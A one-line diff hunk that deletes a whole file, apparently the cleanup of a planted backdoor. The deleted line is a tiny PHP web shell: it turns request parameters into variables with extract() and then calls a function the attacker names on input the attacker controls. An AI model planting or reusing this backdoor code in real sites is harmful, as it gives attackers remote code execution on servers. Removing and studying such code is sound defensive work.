@@ -1,1 +1,0 @@
-<?php extract($_REQUEST) && @$shall(stripslashes($request)) && exit;
